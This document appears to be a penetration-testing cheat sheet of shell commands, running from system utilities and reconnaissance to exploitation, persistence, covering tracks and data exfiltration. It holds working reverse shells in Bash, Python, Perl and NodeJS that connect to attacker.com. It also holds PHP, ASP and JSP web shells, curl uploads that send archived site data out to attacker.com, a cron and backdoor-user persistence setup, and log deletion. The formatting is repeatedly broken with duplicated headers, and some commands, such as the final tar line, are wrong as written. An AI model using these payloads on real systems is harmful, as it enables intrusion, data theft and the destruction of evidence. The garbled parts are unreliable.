## Quick Navigation

**FOUNDATION & SYSTEM UTILITIES** (Step 1)
- **System Utilities & Testing Commands** - File analysis, binary inspection, basic system checks

**DISCOVERY PHASE** (Steps 2-4)
- **Reconnaissance & Information Gathering** - Passive recon, DNS, domain info
- **OSINT & Metadata Tools** - Passive intelligence, theHarvester, exiftool

**SCANNING PHASE** (Steps 4-5)
- **Network Scanning & Enumeration** - Find active hosts and services
- **Vulnerability Assessment** - Identify security weaknesses

**EXPLOITATION PHASE** (Steps 6-10)
- **Web Scanning Tools** - Nikto, SQLmap, Burp, OWASP ZAP
- **Exploitation & Post-Exploitation** - Gain initial access
- **Database Exploitation** - MySQL, PostgreSQL, MongoDB
- **Metasploit Framework** - Automated exploitation with meterpreter
- **Privilege Escalation** - Escalate to higher privileges

**POST-EXPLOITATION PHASE** (Steps 11-14)
- **Social Engineering** - Phishing, credential harvesting
- **System & Network Monitoring** - Monitor activity, analyze logs
- **Data Exfiltration** - Steal & compress data, DNS tunneling

**CLEANUP PHASE** (Step 15)
- **Anti-Forensics** - Remove evidence and cover tracks

**EXTENDED OPERATIONS**
- **Red Team Operations** - Full attack lifecycle simulation
- **Bug Bounty Hunting** - Structured reconnaissance + vulnerability discovery

---


## System Utilities & Testing Commands

Essential utilities for system inspection, file analysis, and security testing.

### File & System Testing

**Test file conditions**

Quick checks for file and directory existence, permissions, and executability.
```bash
test -f /path/to/file     # check whether a file exists
test -d /path/to/dir      # check whether a directory exists
test -r /path/to/file     # check whether a file is readable
test -w /path/to/file     # check whether a file is writable
test -x /path/to/binary   # check whether a file is executable
test -s /path/to/file     # check whether a file exists and is not empty
```
Conditional testing for scripts and security checks.

**View manual pages**

Open and search system manual pages to learn command usage and options.
```bash
man ls                     # open the manual page for ls
man -k keyword             # search manual pages by keyword
man 2 open                 # open the section 2 manual for the open system call
man 3 printf               # open the section 3 manual for printf
```
Access documentation for all commands.

**Determine file type**

Identify a file's format and MIME type before analysis.
```bash
file /path/to/file        # identify a file's type
file -i /path/to/file     # show the file's MIME type
```
Identify file format and encoding.

**View file statistics**

Show filesystem metadata (size, permissions, timestamps) for a file.
```bash
stat /path/to/file        # show file metadata such as size, mode, and timestamps
```
Get detailed info: size, permissions, timestamps, inode.

**Compare files**

Show differences between files or folders to spot changes or tampering.
```bash
diff file1.txt file2.txt         # show line-by-line differences between two files
diff -u file1.txt file2.txt      # unified diff format suitable for patches
diff -r dir1/ dir2/              # recursively compare all files in directories
diff -q file1.txt file2.txt      # only show whether files differ without details
```
Identify changes between files or directories.

### System information: uname & hostname
Quick commands to learn system/kernel and host identity.

**Kernel / system info (`uname`)**
```bash
uname                # print the kernel name
uname -a             # print full system information
uname -r             # print the kernel release
uname -m             # print the machine architecture
uname -n             # print the host name
```

**Hostname / node name (`hostname`)**
> When someone try to retrieve my information so my hostname is visible to attacker.

```bash
hostname             # show the current hostname
hostname -f          # show the fully qualified domain name
hostnamectl status   # show or manage hostname details with systemd
cat /etc/hostname    # display the static hostname file
```

Tip: For distro details, check `cat /etc/os-release`.

**Extract strings from binaries**
```bash
strings /usr/bin/binary        # extract printable strings from a binary
strings -n 10 /usr/bin/binary   # extract strings with at least 10 characters
```
Find readable text in executables (useful for malware analysis).

### Binary & Library Analysis

**List dynamic libraries**

Show which shared libraries an executable requires at runtime.
```bash
ldd /usr/bin/binary              # list shared libraries used by a binary
ldd /path/to/executable          # show required shared libraries
```
Find dependencies for vulnerability research.

**Trace system calls**

Record system calls and signals made by a process for runtime analysis.
```bash
strace /usr/bin/binary                 # trace system calls made by a program
strace -e trace=open,read,write /bin/ls # trace only open, read, and write calls
strace -p <PID>                        # attach to a running process and trace it
```
Monitor what a program does on the system.

**Trace library calls**

Trace calls to shared libraries (glibc, etc.) made by a program.
```bash
ltrace /usr/bin/binary              # trace library calls made by a program
ltrace -e malloc /usr/bin/binary    # trace only malloc-related calls
```
Track library function usage for debugging.

**View symbol table**

List exported symbols and function names inside binaries or libraries.
```bash
nm /usr/bin/binary             # list symbols from a binary
nm -D /usr/lib/libc.so.6       # list dynamic symbols from a shared library
```
See exported functions and symbols.

**Read ELF headers**

Inspect ELF headers and sections to understand binary structure.
```bash
readelf -h /usr/bin/binary          # show the ELF file header
readelf -S /usr/bin/binary          # show ELF section headers
readelf -l /usr/bin/binary          # show ELF program headers
hexdump -C /usr/bin/binary | head   # show the first lines of a hex dump
```
Analyze executable structure and content.

### File Content Analysis
### Viewing & filtering file contents

Quick file viewing commands to print, page, or follow file contents.
```bash
cat file.txt                    # print the full file contents
cat -n file.txt                 # print the file with line numbers
head -n 20 file.txt             # print the first 20 lines
tail -n 50 file.txt             # print the last 50 lines
tail -f /var/log/syslog         # follow new log output live
```

**Filter with grep**

Search files or streams for text patterns with flexible options.
```bash
grep 'pattern' file.txt                 # search for a text pattern
grep -i 'pattern' file.txt              # search without case sensitivity
grep -n 'pattern' file.txt              # show matching line numbers
grep --color=auto 'pattern' file.txt    # highlight the matched text
grep -R --exclude-dir=.git 'pattern' /path  # search recursively through directories
cat file.txt | grep 'pattern'           # filter cat output through grep
```

**Text processing with awk**

Extract and transform fields from text streams and files using pattern/action rules.
```bash
awk '{print $1}' file.txt                # print the first field from each line
awk -F: '{print $1, $3}' /etc/passwd     # split fields on colon and print selected columns
awk 'NR==1 {print}' file.txt             # print only the first line
awk '/error/ {print NR, $0}' file.txt    # print matching lines with line numbers
```

**Stream editing with sed**

Perform scripted, line-oriented edits and substitutions on streams or files.
```bash
sed 's/old/new/' file.txt                # replace the first match on each line
sed 's/old/new/g' file.txt               # replace every match on each line
sed -n '1,10p' file.txt                  # print only lines 1 through 10
sed -i 's/old/new/g' file.txt            # edit the file in place
```

**Translate or delete characters with tr**

Map, delete, or squeeze characters from input streams for simple transformations.
```bash
tr 'a-z' 'A-Z' file.txt                  # convert lowercase to uppercase
tr -d ' ' file.txt                       # delete all whitespace characters
tr -s ' ' file.txt                       # squeeze multiple spaces into one
echo "hello" | tr 'a' 'b'                # replace specific characters
```

### Pager: less
Essential pager for viewing long files and piped output without loading the whole file.

**Basic usage**

Open long output in an interactive pager for navigation and search.
```bash
less file                               # open a file in the pager
```

**Navigation**
```text
Space       # page down
b           # page up
f           # forward
d / u       # half page down / up
g / G       # go to start / end
/pattern    # search forward
?pattern    # search backward
n / N       # next / previous match
q           # quit
```

**Useful options**
```bash
less -N file      # show line numbers in the pager
less -S file      # chop long lines instead of wrapping them
less -R file      # preserve ANSI color output
less +F file      # follow appended output like tail -f
zless file.gz     # view a compressed file in less
```

**Examples**
```bash
less /var/log/syslog                 # open syslog in the pager
tail -n 200 /var/log/syslog | less -S  # page through the last 200 log lines
ls --color=always | less -R         # preserve color when paging command output
less -N bigfile.txt                 # open a file with line numbers shown
```

### Word count: wc
Count lines, words, and bytes in files or streams.

Quickly count lines, words, characters, or longest line length in input.
```bash
wc file.txt           # count lines, words, and bytes in a file
wc -l file.txt        # count the number of lines
wc -w file.txt        # count the number of words
wc -c file.txt        # count the number of bytes
wc -m file.txt        # count the number of characters
wc -L file.txt        # show the length of the longest line
```

**With pipes / examples**
```bash
echo "one two three" | wc -w        # count words from standard input
grep -oE "\w+" file.txt | wc -l    # count words by extracting each match first
awk '{sum+=NF} END{print sum}' file.txt  # count words accurately with awk
```

## Core Commands Summary
**Hex dump files**

Display binary data in hexadecimal and ASCII for inspection.
```bash
hexdump -C /tmp/myfile             # show a canonical hex dump
hexdump -C /tmp/myfile | head -20  # show only the first 20 lines of the dump
```
View binary/text content in hexadecimal format.

**Octal dump**

Alternative binary viewers showing character, hex, or octal representations.
```bash
od -c /tmp/myfile          # show the file as characters
od -x /tmp/myfile          # show the file as hexadecimal values
od -b /tmp/myfile          # show the file as octal bytes
```
Alternative binary content viewer.

### Directory & Permission Analysis

**Find file locations**

Quickly locate binaries, manuals, and files on the system.
```bash
which bash                 # show the path of a command in PATH
whereis ls                 # show the binary, source, and man page locations
locate passwd              # find all files named passwd or similar
locate filename            # search the file database by name
```
Locate executables and resources.

**Check file attributes**

View and modify extended filesystem attributes such as immutable flags.
```bash
lsattr /path/to/file       # show extended file attributes
chattr +i /path/to/file    # make a file immutable
chattr -i /path/to/file    # remove the immutable flag
```
View and modify immutable/append-only flags.

### Practical Security Use Cases

**Check if port is listening (alternative to netstat)**
```bash
test -S /var/run/docker.sock && echo "Docker socket exists"  # check whether the Docker socket exists
```

**Verify binary hasn't been modified**
```bash
sha256sum /usr/bin/binary > checksum.txt   # save the binary's SHA-256 checksum
# Later: verify with
sha256sum -c checksum.txt                  # verify the saved checksum file
```

**Find recently modified files**
```bash
find /home -type f -mtime -7   # find files modified within the last 7 days
```

**Analyze suspicious executable**
```bash
file suspected_binary                          # identify the file type
strings suspected_binary | grep -i "shell|http|cmd"  # search strings for suspicious terms
ldd suspected_binary                           # list shared library dependencies
readelf -S suspected_binary                    # show ELF sections
strace suspected_binary 2>&1 | head -50        # capture the first 50 traced system calls
```

---


## Reconnaissance & Information Gathering

Gather intel about targets before attacking.

### Domain and Host Information

**Find IP of domain**

Resolve a domain to its IP address for targeting.
```bash
nslookup example.com      # resolve a domain name to an IP address
```
DNS lookup to get target IP.

**Detailed DNS records**

Query DNS for all record types and responses.
```bash
dig example.com           # query DNS records for a domain
```
Shows all DNS data.

**WHOIS domain info**

Retrieve domain registration and ownership metadata.
```bash
whois example.com         # look up domain registration information
```
Get domain owner, registrar, dates.

**Reverse DNS**

Find the hostname associated with an IP address.
```bash
dig -x 192.168.1.1        # perform a reverse DNS lookup on an IP address
```
Find hostname from IP.

### Network Scanning

**Ping a network range**
```bash
**Ping a network range**

Quick liveness test of a host using ICMP.
```bash
ping -c 1 192.168.1.1     # send one ping to check whether a host is alive
```
Test if host is alive.

**Ping sweep (find active hosts)**
```bash
**Ping sweep (find active hosts)**

Probe an entire subnet to discover live hosts.
```bash
for i in {1..254}; do ping -c1 192.168.1.$i & done  # ping every host in the subnet
```
Find all active IPs in subnet.

### Passive Information

**Check DNS servers**
```bash
**Check DNS servers**

Show system-configured DNS resolvers.
```bash
cat /etc/resolv.conf      # show the configured DNS servers
```
See which DNS your target uses.

**Test connectivity**
```bash
**Test connectivity**

Run a combined traceroute and ping with live latency stats.
```bash
mtr google.com            # trace the route to a host with live latency stats
```
Live trace route to target.

---


## OSINT & Metadata Tools

Gather intelligence without touching the target.

### Email & User Harvesting

**Find emails for domain**
```bash
theHarvester -d example.com -b google  # gather emails and subdomains from Google
```
Harvests emails from Google, Bing, etc.

**Find subdomains**
```bash
theHarvester -d example.com -b all     # run passive subdomain enumeration against many sources
```
Passive subdomain enumeration.

### Metadata Extraction

**Extract metadata from files**
```bash
exiftool document.pdf     # extract metadata from a file
```
Get hidden metadata (author, dates, GPS).

**Batch extract from images**
```bash
exiftool *.jpg            # extract metadata from all JPEG files in the folder
```
Extract all image metadata.

**Remove metadata**
```bash
exiftool -all= document.pdf  # remove metadata from a file
```
Strip sensitive metadata.

### Shodan (Internet Search Engine)

**Search Shodan CLI**
```bash
**Search Shodan CLI**

Search the internet for exposed services and devices.
```bash
shodan search apache      # search Shodan for Apache hosts
```
Find systems running Apache.

**Find webcams**
```bash
shodan search webcam      # search Shodan for exposed webcams
```
Locate exposed cameras.

**Get host info**
```bash
shodan host 1.2.3.4       # display Shodan data for an IP address
```
Get details about IP from Shodan.

### Passive DNS & IP Info

**Check IP reputation**
```bash
**Check IP reputation**

Query external reputation services for IP threat history.
```bash
curl https://api.abuseipdb.com/api/v2/check?ipAddress=1.2.3.4  # check IP reputation with AbuseIPDB
```
Check if IP is blacklisted.

**Find DNS history**
```bash
**Find DNS history**

Show only DNS answers to inspect current records quickly.
```bash
dig +nocmd example.com +noall +answer  # print only the DNS answer section
```
Check DNS records.

---

Find open ports and running services.

### Port Scanning with Nmap

**Basic port scan**
```bash
**Basic port scan**

Default Nmap scan to discover commonly open TCP ports.
```bash
nmap example.com          # scan the most common 1000 TCP ports
```
Scan most common 1000 ports.

**Scan specific ports**
```bash
**Scan specific ports**

Probe only the listed ports to speed up scans or focus on services.
```bash
nmap -p 22,80,443,3306 example.com  # scan only the specified ports
```
Check only these ports (SSH, HTTP, HTTPS, MySQL).

**Scan ALL ports**
```bash
**Scan ALL ports**

Comprehensive scan across all TCP ports (time-consuming).
```bash
nmap -p- example.com      # scan all 65,535 TCP ports
```
Check all 65,535 ports (slow!).

**Service version detection**
```bash
**Service version detection**

Probe open ports to identify service software and versions.
```bash
nmap -sV example.com      # detect service versions on open ports
```
Identify what software is running.

**OS detection**
```bash
**OS detection**

Attempt to fingerprint the remote operating system.
```bash
nmap -O example.com       # attempt operating system detection
```
Guess operating system.

**Aggressive scan (VERY LOUD)**
```bash
**Aggressive scan (VERY LOUD)**

Run a combined set of scans (scripts, version, OS, traceroute).
```bash
nmap -A example.com       # run aggressive scan options
```
Service, OS, script scan, traceroute.

**UDP scan**
```bash
**UDP scan**

Probe UDP services which are commonly overlooked by basic scans.
```bash
nmap -sU example.com      # scan UDP ports
```
Scan UDP ports.

**Scan through firewall**
```bash
**Scan through firewall**

Skip host discovery steps when ICMP is blocked; scan directly.
```bash
nmap -Pn example.com      # skip host discovery and scan directly
```
Don't ping first, just scan.

**Stealth scan (slower)**
```bash
**Stealth scan (slower)**

Perform a SYN scan that may be less noisy to logging systems.
```bash
nmap -sS example.com      # run a SYN scan
```
SYN scan, less likely to be logged.

**Save output**
```bash
nmap -A example.com -oN scan.txt  # save scan output to a normal text file
```
Save results to file.

### Service Enumeration

**Check SMB shares**
```bash
**Check SMB shares**

Enumerate available SMB shares and access points on a host.
```bash
smbclient -L //192.168.1.1   # list SMB shares on a host
```
List network shares.

**Check HTTP headers**
```bash
**Check HTTP headers**

Fetch response headers to inspect server info and security headers.
```bash
curl -I https://example.com  # fetch only HTTP response headers
```
Get server info and headers.

**Check HTTP methods**
```bash
**Check HTTP methods**

Query which HTTP methods the server accepts (e.g., PUT, DELETE).
```bash
curl -X OPTIONS -v https://example.com  # ask the server which HTTP methods it allows
```
See what HTTP methods allowed.

---


## Vulnerability Assessment

Find security weaknesses.

### Web Vulnerability Scanning

**Check SSL/TLS**
```bash
openssl s_client -connect example.com:443  # inspect the TLS certificate and handshake
```
Check certificate and SSL version.

**Check HTTP methods**
```bash
nmap --script http-methods example.com     # run the Nmap HTTP methods script
```
Find dangerous HTTP methods.

**Subdomain enumeration**
```bash
nmap -sL example.com       # perform a list scan without probing hosts
```
Find subdomains.

### Common Weak Services

**Check Telnet (insecure)**
```bash
telnet example.com 23      # open a Telnet connection to a host
```
Test unencrypted access.

**Check FTP**
```bash
ftp example.com            # connect to an FTP server
```
Test FTP access (unencrypted).

**Check default credentials**
```bash
nmap -p 3389 --script rdp-enum-encryption 192.168.1.1  # check RDP encryption settings
```
Find RDP weaknesses.

---


## Web Scanning Tools

Automated web application vulnerability testing.

### Nikto Web Server Scanner

**Basic web scan**
```bash
**Basic web scan**

Run a fast server-level scan for common web misconfigurations and issues.
```bash
nikto -h http://example.com  # scan a web server for common vulnerabilities
```
Scan for web vulnerabilities.

**Scan with proxy**
```bash
**Scan with proxy**

Route scanner traffic through an intercepting proxy for inspection.
```bash
nikto -h http://example.com -useproxy http://127.0.0.1:8080  # route Nikto through a proxy
```
Use Burp Suite proxy.

### SQLmap - SQL Injection

**Find SQL injection**
```bash
**Find SQL injection**

Automate testing for SQL injection and enumerate database contents.
```bash
sqlmap -u "http://example.com/search.php?q=test" --dbs  # test for SQL injection and list databases
```
Test for SQLi and enumerate databases.

**Dump database**
```bash
**Dump database**

Extract table contents once injection is confirmed.
```bash
sqlmap -u "http://example.com/search.php?q=test" -D database_name -T users --dump  # dump a specific table from a database
```
Extract user table.

**Interactive shell**
```bash
sqlmap -u "http://example.com/search.php?q=test" --os-shell  # try to obtain an operating-system shell
```
Get OS command execution.

### Burp Suite

**Start proxy**
```bash
**Start proxy**

Launch Burp Suite for HTTP interception, scanning, and analysis.
```bash
burpsuite &                # start Burp Suite in the background
```
Launch Burp (set to 127.0.0.1:8080).

**Use proxy with curl**
```bash
curl -x http://127.0.0.1:8080 http://example.com  # send traffic through the local proxy
```
Route traffic through Burp.

### OWASP ZAP

**Start ZAP**
```bash
**Start ZAP**

Start OWASP ZAP for automated and interactive web scanning.
```bash
zaproxy &                  # start OWASP ZAP in the background
```
Launch OWASP ZAP.

**Automated scan**
```bash
zap-cli scan -r report.html http://example.com  # run an automated ZAP scan and save a report
```
Full web app scan with report.

---


## Database Exploitation

Attack databases directly.

### MySQL Enumeration & Exploitation

**Connect to MySQL**
```bash
**Connect to MySQL**

Open a MySQL client connection to interact with the database.
```bash
mysql -h 192.168.1.5 -u root -p  # connect to a MySQL server and prompt for a password
```
Connect to MySQL server.

**No password needed?**
```bash
mysql -h 192.168.1.5 -u root    # connect to MySQL without entering a password
```
Sometimes no auth required.

**Enumerate databases**
```bash
mysql -h 192.168.1.5 -u root -p -e "SHOW DATABASES;"  # list MySQL databases
```
List all databases.

**Get users and passwords**
```bash
mysql -h 192.168.1.5 -u root -p -e "SELECT user, password FROM mysql.user;"  # query MySQL users and password hashes
```
Dump MySQL users.

**Read files**
```bash
mysql -h 192.168.1.5 -u root -p -e "LOAD_FILE('/etc/passwd')"  # attempt to read a local file through MySQL
```
Read files via MySQL.

### PostgreSQL Exploitation

**Connect to PostgreSQL**
```bash
**Connect to PostgreSQL**

Launch a PostgreSQL client session to query and enumerate data.
```bash
psql -h 192.168.1.5 -U postgres  # connect to a PostgreSQL server
```
Connect to PostgreSQL.

**List databases**
```bash
psql -h 192.168.1.5 -U postgres -c "SELECT datname FROM pg_database WHERE datistemplate = false;"  # list non-template PostgreSQL databases
```
Enumerate databases.

**Get table contents**
```bash
psql -h 192.168.1.5 -U postgres -d database_name -c "SELECT * FROM table_name;"  # dump rows from a PostgreSQL table
```
Dump table data.

**Execute commands**
```bash
psql -h 192.168.1.5 -U postgres -c "CREATE FUNCTION exec(text) returns text AS 'select system($1)' language SQL;"  # create a UDF-style function for command execution
```
Code execution via UDF.

### MongoDB Exploitation

**Connect to MongoDB**
```bash
**Connect to MongoDB**

Start an interactive MongoDB shell to inspect databases and collections.
```bash
mongo 192.168.1.5:27017     # connect to MongoDB on the default port
```
Connect to MongoDB.

**List databases**
```bash
mongo 192.168.1.5:27017/admin --eval "db.adminCommand('listDatabases')"  # list all MongoDB databases
```
Show all databases.

**Dump collection**
```bash
mongo 192.168.1.5:27017/database_name --eval "db.collection_name.find().pretty()"  # print a MongoDB collection in readable form
```
Export collection data.

**Check authentication**
```bash
mongo 192.168.1.5:27017   # connect to MongoDB
use admin                 # switch to the admin database
db.getUsers()             # list users if authentication is enabled
```
See if authentication is enabled.

---

Common techniques for gaining access.

### Credential Attacks

**Brute force SSH**
```bash
**Brute force SSH**

Use a password list to attempt authentication against SSH services.
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://example.com  # brute-force SSH logins
```
Try passwords against SSH.

**HTTP basic auth brute force**
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt http-basic://example.com  # brute-force HTTP basic auth
```
Try passwords on HTTP auth.

**Crack password hashes**
```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt  # crack NTLM hashes with a wordlist
```
Hash cracking with dictionary.

### File Transfer for Exploitation

**Copy exploitation tool**
```bash
**Copy exploitation tool**

Send files or tools to a remote host for local execution.
```bash
scp exploit.sh user@target:/tmp/  # copy a file to a remote host
```
Transfer script to target.

**Download file from target**
```bash
scp user@target:/etc/passwd ./    # copy a file from a remote host to the current directory
```
Get files from target.

**Download with curl**
```bash
curl -O http://attacker.com/shell.sh  # download a file and keep its original name
```
Download shell.

### Reverse Shells

**Bash reverse shell**
```bash
**Bash reverse shell**

Create a simple reverse TCP shell back to an attacker-controlled listener.
```bash
bash -i >& /dev/tcp/attacker.com/4444 0>&1  # open a bash reverse shell to the attacker
```
Connect back to attacker.

**Python reverse shell**
```bash
**Python reverse shell**

Use Python to spawn a remote interactive shell to an attacker's listener.
```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'  # open a Python reverse shell
```
Python shell connection.

**Listener for reverse shell**
```bash
**Listener for reverse shell**

Start a netcat listener to receive inbound reverse shells.
```bash
nc -lvnp 4444  # listen for an incoming reverse shell on port 4444
```
Listen for incoming connection on port 4444.

### Web Shells & Payloads

**Simple PHP web shell**
```php
**Simple PHP web shell**

A minimal PHP backdoor that executes arbitrary system commands via a query parameter.
```php
<?php system($_GET['cmd']); ?>
```
Save as shell.php, access: `http://target/shell.php?cmd=id`

**ASP web shell**
```asp
<%@ Page Language="C#" %>
<% System.Diagnostics.Process.Start("cmd.exe", "/c " + Request["cmd"]); %>
```
For Windows IIS servers.

**JSP web shell**
```jsp
<%@ page import="java.io.*" %>
<% 
  String cmd = request.getParameter("cmd");
  Process p = Runtime.getRuntime().exec(cmd);
  BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
  String line; while ((line = br.readLine()) != null) { out.println(line + "<br>"); }
%>
```
For Java servers.

**One-liner NodeJS payload**
```bash
**One-liner NodeJS payload**

Execute a system command from a Node.js context to spawn a reverse shell.
```bash
require('child_process').exec('bash -i >& /dev/tcp/attacker.com/4444 0>&1')  # execute a Bash reverse shell from Node.js
```

**Perl reverse shell**
```perl
perl -e 'use Socket;$i="attacker.com";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'  # open a Perl reverse shell
```

---


## Metasploit Framework

Automated exploitation framework.

### MSFConsole Basics

**Start MSFConsole**
```bash
**Start MSFConsole**

Open the Metasploit interactive console for exploit development and execution.
```bash
msfconsole                 # start the Metasploit console
```
Launch Metasploit.

**Search for exploits**
```bash
**Search for exploits**

Locate exploit modules by type, platform, or keyword.
```bash
msf> search type:exploit platform:linux  # search Metasploit for Linux exploits
```
Find exploits in Metasploit.

**Load exploit**
```bash
msf> use exploit/linux/http/openssh_backdoor  # load a specific exploit module
```
Select an exploit.

**Show options**
```bash
msf> show options          # display required exploit settings
```
See required parameters.

**Set target**
```bash
msf> set RHOSTS 192.168.1.5  # set the target host
msf> set RPORT 22            # set the target port
```
Specify target.

**Run exploit**
```bash
msf> run                   # execute the selected exploit
```
Execute the exploit.

### Meterpreter Commands

**Get system info**
```
**Get system info**

Retrieve host details from a meterpreter session.
```
meterpreter> sysinfo       # display system information on the target
```
System information.

**Get shell**
```
**Get shell**

Escalate to an interactive OS shell from meterpreter.
```
meterpreter> shell         # drop into a normal command shell
```
Drop to normal shell.

**Upload files**
```
meterpreter> upload /tmp/payload.sh /tmp/  # upload a file to the target
```
Upload to target.

**Download files**
```
meterpreter> download /etc/passwd /tmp/    # download a file from the target
```
Download from target.

**Dump hashes**
```
meterpreter> hashdump      # dump password hashes from the target
```
Get SAM hashes (Windows).

**Migrate process**
```
meterpreter> migrate explorer.exe  # move Meterpreter into another process
```
Move to another process.

**Create persistence**
```
meterpreter> persistence -X -i 10 -p 4444 -r attacker.com  # create a persistence handler
```
Restart handler on reboot.

---

Full team-based attack scenarios.

### Initial Access

**Check for web vulnerabilities (manual)**
```bash
curl https://example.com/admin.php  # request a specific page to probe for hidden admin content
```
Probe for admin pages.

**Directory brute force**
```bash
dirbuster -u http://example.com -l /usr/share/wordlists/common.txt  # brute-force directories and files on a web server
```
Find hidden directories.

**SQL Injection test**
```bash
curl "http://example.com/search.php?q=1' OR '1'='1"  # send a basic SQL injection test payload
```
Test for SQL injection.

### Lateral Movement

**Check local network**
```bash
arp -a                      # list hosts seen on the local network
```
Find other systems on network.

**Find trusts between systems**
```bash
nltest /domain_trusts       # list Windows domain trusts
```
Windows domain trusts (if on Windows).

**List network services**
```bash
ss -tulnp                   # show listening ports and the processes using them
```
Find listening services.

### Persistence

**Add SSH key (stay in system)**
```bash
echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys  # add an SSH key for login access
```
Add SSH key for access.

**Create user account**
```bash
sudo useradd -m -s /bin/bash hacker  # create a new local user account
```
Create backdoor user.

**Setup cron job persistence**
```bash
(crontab -l; echo "* * * * * /tmp/shell.sh") | crontab -  # schedule a job to run every minute
```
Run command every minute.

### Covering Tracks

**Clear bash history**
```bash
history -c                  # clear the current shell history
rm ~/.bash_history          # remove the saved Bash history file
```
Remove command history.

**Clear logs**
```bash
sudo rm /var/log/auth.log   # delete the authentication log file
```
**These are ONLY for authorized testing!**
 - Get written permission FIRST
 - Only test systems you own or have signed authorization

---


## Privilege Escalation

Gain higher access levels.

### Check Current Privileges

**Who am I?**
```bash
**Who am I?**

Quickly display the current effective user and group IDs.
```bash
whoami                      # print the current username
id                          # print the current user ID and groups
```
Shows current user and groups.

**Can I run sudo?**
```bash
**Can I run sudo?**

List which commands the current user may run with sudo.
```bash
sudo -l                     # list commands allowed by sudo
```
Check sudo permissions.

**Find SUID binaries**
```bash
**Find SUID binaries**

Search for setuid-root files that may allow privilege escalation.
```bash
find / -perm -4000 2>/dev/null  # find SUID binaries on the system
```
Find programs running as root.

**Check kernel version**
```bash
uname -a                    # show the kernel and system version
```
Old kernels have exploits.

### Escalation Techniques

**Use sudo without password**
```bash
sudo bash                   # start a root shell if sudo is allowed
```
Execute command as root (if allowed).

**Exploit weak sudo permissions**
```bash
sudo /usr/bin/nano          # run nano with elevated privileges
```
If you can run editor as sudo, type shell commands.

**Find password in files**
```bash
find / -type f -name "*.txt" -o -name "*.conf" 2>/dev/null | xargs grep -l password  # search files for hardcoded passwords
```
Search for hardcoded passwords.

**Check cron jobs**
```bash
crontab -l                  # list the current user's scheduled jobs
cat /etc/cron.d/*           # display system cron jobs
```
Find scripts you can modify.

**Check directory permissions**
```bash
ls -la /opt                 # list contents and permissions of /opt
ls -la /tmp                 # list contents and permissions of /tmp
```
Find writable directories.

---


## Social Engineering

Tactics to compromise humans instead of systems.

### Phishing Tools

**Create phishing email template**
```bash
**Create phishing email template**

Use frameworks to craft and deploy phishing templates and payloads.
```bash
# Using msfconsole                                  # note that these steps use Metasploit
msfconsole                                         # start Metasploit for phishing-related modules
msf> search phishing                               # search Metasploit for phishing modules
msf> use exploit/windows/fileformat/office_word_hta  # load an Office file-format exploit
```

**Check for social media info**
```bash
**Check for social media info**

Query public APIs for user metadata that can aid targeting.
```bash
curl https://api.github.com/users/username  # query GitHub user metadata
```
Find GitHub info leakage.

**Email enumeration**
```bash
theHarvester -d example.com -b all  # collect emails and subdomains from many sources
```
Find valid email addresses.

### Credential Harvesting

**Create fake login page**
```bash
setoolkit                  # launch the Social-Engineer Toolkit
# Choose: Social Engineering Attacks > Website Attack Vectors
# > Credential Harvester Attack Method
```
SET creates fake login pages.

**Payload delivery**
```bash
python -m SimpleHTTPServer 8080  # start a simple HTTP server to host files
```
Host malicious files.

---


## System & Network Monitoring

Monitor for activity and evidence.

### Real-time Monitoring

**Watch processes**
```bash
**Watch processes**

Open a live view of running processes and system load.
```bash
top                        # show live process activity
```
Live process monitor.

**Watch file access**
```bash
**Watch file access**

Follow log files in real time to observe authentication events.
```bash
tail -f /var/log/auth.log  # follow authentication log updates live
```
See login attempts.

**Monitor ports**
```bash
**Monitor ports**

List active listening sockets and the owning processes.
```bash
ss -tulnp                  # show listening ports and process names
```
See what's listening.

### Log Analysis

**View login history**
```bash
last                       # show recent logins and reboots
```
See who logged in.

**Check sudo usage**
```bash
sudo cat /var/log/auth.log | grep sudo  # search auth logs for sudo usage
```
See sudo commands (if logged in).

**Find recent files**
```bash
find / -type f -newermt "2026-05-20" 2>/dev/null  # find files modified after a given date
```
Find files modified after date.

### Network Monitoring

**Capture traffic**
```bash
sudo tcpdump -i eth0 -n    # capture packets on interface eth0 without name resolution
```
Live packet capture.

**Capture to file**
```bash
sudo tcpdump -i eth0 -w capture.pcap  # save captured packets to a file
```
Save traffic for analysis.

**Filter specific traffic**
```bash
sudo tcpdump -i eth0 -n "port 80"  # capture only traffic for port 80
```
Capture HTTP only.

---


## Data Exfiltration

Methods to steal data from targets.

### File Transfer Methods

**Exfiltrate via DNS**
```bash
**Exfiltrate via DNS**

Send file contents out by encoding data into DNS queries.
```bash
exfil -f /etc/passwd -d example.com  # send file data through DNS queries
```
Hide data in DNS queries.

**Compress and upload**
```bash
**Compress and upload**

Archive data locally and upload via HTTP for exfiltration.
```bash
tar czf sensitive.tar.gz /var/www/html/  # compress a directory into an archive
curl -F "file=@sensitive.tar.gz" http://attacker.com/upload.php  # upload the archive with multipart form data
```
Compress before exfil.

**Split large files**
```bash
**Split large files**

Break large archives into chunks for incremental upload.
```bash
split -b 1M largefile.zip largefile.zip.  # split a large file into 1 MB chunks
for i in largefile.zip.*; do curl -F "file=@$i" http://attacker.com/upload.php; done  # upload each chunk one by one
```
Upload in chunks.

### Covert Channels

**Use ICMP for data transfer**
```bash
icmptunnel -s 192.168.1.5  # start an ICMP tunnel server
icmptunnel -c example.com   # connect to an ICMP tunnel server
```
Tunnel data through ICMP.

**Use DNS tunneling**
```bash
dnscat2                     # start the dnscat2 tool
dnscat2 -l 127.0.0.1        # listen locally for dnscat2 sessions
```
Data exfil via DNS.

### Database Dumping

**Dump MySQL database**
```bash
mysqldump -h 192.168.1.5 -u root -p database_name > dump.sql  # export a MySQL database to SQL
```
Export full database.

**Large file theft**
```bash
dd if=/dev/sda | gzip > disk_image.gz  # read a disk image and compress it
tar czf /var/www/html/index.html > /tmp/archive.tar.gz  # create a compressed archive from files
```
Steal entire files/disks.

---


